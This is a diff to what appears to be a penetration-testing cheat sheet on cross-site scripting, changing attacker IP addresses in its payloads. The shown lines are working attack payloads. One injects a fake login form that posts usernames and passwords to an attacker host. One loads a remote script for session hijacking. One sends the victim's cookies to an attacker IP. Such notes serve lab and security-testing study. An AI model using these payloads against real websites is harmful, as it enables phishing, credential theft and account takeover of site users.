@@ -31,12 +31,12 @@ Identify:
 ```
 Payload
 ```bash
-'><img src=x onerror="document.write('<h3>Please login to continue</h3><form action=http://10.10.16.7:5656><input type=\'text\' name=\'username\' placeholder=\'Username\'><input type=\'password\' name=\'password\' placeholder=\'Password\'><input type=\'submit\' name=\'submit\' value=\'Login\'></form>'); document.getElementById('urlform').remove();">
+'><img src=x onerror="document.write('<h3>Please login to continue</h3><form action=http://10.10.14.51><input type=\'text\' name=\'username\' placeholder=\'Username\'><input type=\'password\' name=\'password\' placeholder=\'Password\'><input type=\'submit\' name=\'submit\' value=\'Login\'></form>'); document.getElementById('urlform').remove();">
 ```
 ## Session Hijacking
 Payload
 ```bash
-"><script src=http://10.10.16.7:8000/script.js</script>
+"><script src=http://10.10.14.51/script.js></script>
 ```
 ```javascript
 document.location='http://10.10.16.7/index.php?c='+document.cookie;
